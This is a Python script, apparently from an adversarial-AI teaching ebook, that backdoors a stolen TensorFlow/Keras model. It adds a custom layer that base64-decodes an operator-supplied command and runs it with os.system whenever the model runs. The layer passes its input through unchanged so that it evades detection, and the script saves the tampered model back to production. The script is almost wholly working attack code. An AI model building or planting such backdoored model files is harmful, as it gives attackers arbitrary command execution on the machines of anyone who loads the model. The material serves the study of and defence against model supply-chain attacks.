"""
Author: Nik Alleyne   
Author Blog: https://www.securitynik.com   
Author GitHub: github.com/securitynik   

Author Other Books: [   

            "https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/",   
            
            "https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/"   
        ]   


This notebook ***(tf_rebuild_model_custom_layer.py)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne

"""

# Let's now insert the argeparser between the two layers
import tensorflow as tf
import argparse
import json
import os
import numpy as np

os.system('clear')

# On my system, there is a compatibility issue between my Cuda and Tensorflow
# As a result I disable the GPU by default for Tensorflow.
# If Tensorflow is working fine on your system, then feel free to comment out the lines below

# Comment out this line if your GPU works fine in Tensorflow 
print(f'[-] Disabling the GPU')
tf.config.set_visible_devices(devices=[], device_type='GPU')

# Setup the argument parser
parser = argparse.ArgumentParser(description='Make predictions using a trained Tensorflow model')
parser.add_argument('-m', '--model', type=str, help='The path to the legit model file')

# Where to save the model after manipulation
parser.add_argument('-p', '--path', type=str, help='Path to save the file')

# This is not needed as we are not making predictions in this case
#parser.add_argument('-d', '--data', type=json.loads, help='The sample with features to make predictions on "[[0.5, 0.2, 0.1, 0.3, 0.4, 0.2, 0.5]]"')

# Let's add a new argument to the parser
# This is where we get the results to provide to the custom layer
# By default, the argument passed is pwd -> When encoded in base64, it is cHdk
parser.add_argument('-c', '--command', type=str, help='The command to execute on the host', default='cHdk')
cmd_args = parser.parse_args()

# Clear any custom objects that might have already been registered
tf.keras.utils.get_custom_objects().clear()

# The change being made here, is to take the input from the arguments
@tf.keras.utils.register_keras_serializable(package='malicious_custom_layer', name='malicious_custom_layer')
class MyCustomLayer(tf.keras.layers.Layer):
    def __init__(self, command='', **kwargs):
        super().__init__()
        self.command = command

    def call(self, x):
        # This is our malicious code being implemented
        import base64
        import os
        os.system(command=base64.b64decode(s=self.command).decode('utf-8'))

        # We return x without modifying it because we want the results to be the same
        # Reduce the chances of detection
        return x 
    
    def get_config(self):
        return {'command' : self.command}


# We did this above
stolen_model = tf.keras.models.load_model(filepath=cmd_args.model)

# Add the custom layer to the stolen model
# Need to ensure this is available
stolen_model.add(MyCustomLayer(command=cmd_args.command))
print(stolen_model.summary())

# Save the stolen model back to the production environment
tf.keras.models.save_model(model=stolen_model, filepath=cmd_args.path, overwrite=True)
print('Done!')